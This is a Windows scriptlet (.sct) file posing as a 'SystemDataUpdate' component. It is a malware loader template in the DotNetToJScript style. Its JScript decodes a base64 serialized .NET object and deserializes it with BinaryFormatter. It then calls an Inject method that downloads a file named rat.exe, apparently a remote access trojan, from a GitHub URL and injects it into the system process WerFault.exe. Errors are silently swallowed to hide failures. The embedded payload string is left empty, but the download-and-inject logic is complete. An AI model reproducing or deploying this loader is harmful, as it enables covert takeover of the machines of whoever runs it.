<?XML version="1.0"?>
<scriptlet>
<registration
    description="SystemDataUpdate"
    progid="SystemData"
    version="1.0"
    classid="{20001111-1000-0000-0000-0000FEEDDCDC}"
>
    <script language="JScript">
        <![CDATA[
            function setversion() {}
            function debug(s) {}
            
            function base64ToStream(b) {
                var enc = new ActiveXObject("System.Text.ASCIIEncoding");
                var length = enc.GetByteCount_2(b);
                var ba = enc.GetBytes_4(b);
                var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
                ba = transform.TransformFinalBlock(ba, 0, length);
                var ms = new ActiveXObject("System.IO.MemoryStream");
                ms.Write(ba, 0, (length / 4) * 3);
                ms.Position = 0;
                return ms;
            }

            // Senin özel serialized verin
            var serialized_obj = "";
            
            var entry_class = 'SystemDataManager.Program';

            try {
                setversion();
                var stm = base64ToStream(serialized_obj);
                var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
                var al = new ActiveXObject('System.Collections.ArrayList');
                var d = fmt.Deserialize_2(stm);
                al.Add(undefined);
                var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
                
                // Senin EXE linkin
                o.Inject("https://github.com/Boboalover/ratanaman/raw/refs/heads/main/rat.exe", "C:\\Windows\\System32\\WerFault.exe");

            } catch (e) {
                // Hata mesajını sessizce yutmak veya debug etmek için
            }
        ]]>
    </script>
</registration>
</scriptlet>
